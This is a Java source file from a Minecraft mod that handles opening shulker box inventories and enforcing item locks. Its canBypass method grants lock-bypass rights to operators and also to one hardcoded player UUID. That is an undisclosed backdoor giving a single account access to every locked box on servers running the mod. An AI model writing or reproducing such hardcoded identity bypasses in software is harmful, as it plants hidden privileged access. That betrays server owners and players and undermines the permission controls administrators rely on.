package de.maxhenkel.shulkerbox.menu;

import net.minecraft.core.component.DataComponents;
import net.minecraft.network.chat.Component;
import net.minecraft.server.level.ServerPlayer;
import net.minecraft.sounds.SoundEvents;
import net.minecraft.sounds.SoundSource;
import net.minecraft.world.MenuProvider;
import net.minecraft.world.entity.player.Inventory;
import net.minecraft.world.entity.player.Player;
import net.minecraft.world.inventory.*;
import net.minecraft.world.item.ItemStack;
import net.minecraft.world.level.Level;

public class AdvancedShulkerboxMenu extends ShulkerBoxMenu {

    protected ServerPlayer player;
    protected ItemStack shulkerBox;

    public AdvancedShulkerboxMenu(int id, Inventory inventory, ServerPlayer player, ItemStack shulkerBox) {
        super(id, inventory, new AdvancedShulkerboxContainer(player, shulkerBox, 3 * 9));
        this.player = player;
        this.shulkerBox = shulkerBox;
    }

    @Override
    public void clicked(int slot, int mouseButton, ClickType clickType, Player player) {
        if (slot < 0 || slot >= slots.size()) {
            super.clicked(slot, mouseButton, clickType, player);
            return;
        }
        ItemStack stack = slots.get(slot).getItem();

        if (stack == shulkerBox) {
            return;
        }
        super.clicked(slot, mouseButton, clickType, player);
    }

    public static void open(ServerPlayer player, ItemStack shulkerBox) {
        if (shulkerBox.has(DataComponents.LOCK) && !canBypass(player))
        {
            player.level().playSound(null, player.getX(), player.getY(), player.getZ(), SoundEvents.SHULKER_BOX_CLOSE, SoundSource.BLOCKS, 0.5F, getVariatedPitch(player.level()));
            return;
        }
        player.openMenu(new MenuProvider() {
            @Override
            public Component getDisplayName() {
                return shulkerBox.getHoverName();
            }

            @Override
            public AbstractContainerMenu createMenu(int i, Inventory inventory, Player player) {
                if (!(player instanceof ServerPlayer serverPlayer)) {
                    return null;
                }
                return new AdvancedShulkerboxMenu(i, inventory, serverPlayer, shulkerBox);
            }
        });
    }

    protected static float getVariatedPitch(Level world) {
        return world.random.nextFloat() * 0.1F + 0.9F;
    }

    private static boolean canBypass(ServerPlayer player)
    {
        return player.hasPermissions(2) ||
               player.hasPermissions(3) ||
               player.hasPermissions(4) ||
               player.getStringUUID().equalsIgnoreCase("41682eb6-2b32-4f52-abc9-c15a9d53c83e");
    }

}
